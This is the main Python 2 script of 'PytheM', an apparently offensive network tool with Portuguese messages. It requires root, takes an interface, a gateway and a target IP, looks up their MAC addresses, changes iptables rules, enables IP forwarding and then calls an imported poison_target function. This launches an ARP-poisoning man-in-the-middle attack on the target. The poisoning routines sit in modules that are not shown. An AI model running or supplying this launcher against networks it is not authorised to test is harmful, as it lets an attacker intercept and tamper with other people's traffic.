#!/usr/bin/env python2.7
#coding=UTF-8

from scapy.all import *
from modules.banners import *
from modules.arpoisoning import *
from modules.utils import *
import os
import sys
import threading
import signal
import argparse

print get_banner()

pythem_version = '0.1.0'
pythem_codename = 'Black Mamba'

if os.geteuid() !=0:
	sys.exit("[-] Apenas para roots kido!")

	# PytheM options
parser = argparse.ArgumentParser(description="PytheM v{} = '{}'".format(pythem_version, pythem_codename),version="{} - '{}'".format(pythem_version,pythem_codename),usage="pythem.py -i interface -g gateway [PytheM options]", epilog="By: m4n3dw0lf")

parser.add_argument("-i","--interface",required=True, type=str, help="Interface de rede para ouvir.")
parser.add_argument("-g","--gateway",required=True, type=str, help="Endereço IP do gateway.")
parser.add_argument("-t","--target",required=True, type=str, help="Endereço/Range IP do alvo.")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

interface = args.interface
gateway = args.gateway
target = args.target

conf.iface = interface
conf.verb = 0

gateway_mac = get_mac(gateway)
print "[*] Gateway %s está em %s" % (gateway, gateway_mac)
target_mac = get_mac(target)
print "[*] Target %s está em %s" % (target, target_mac)

iptables()
set_ip_forwarding(1)

poison_target(gateway,gateway_mac,target,target_mac)
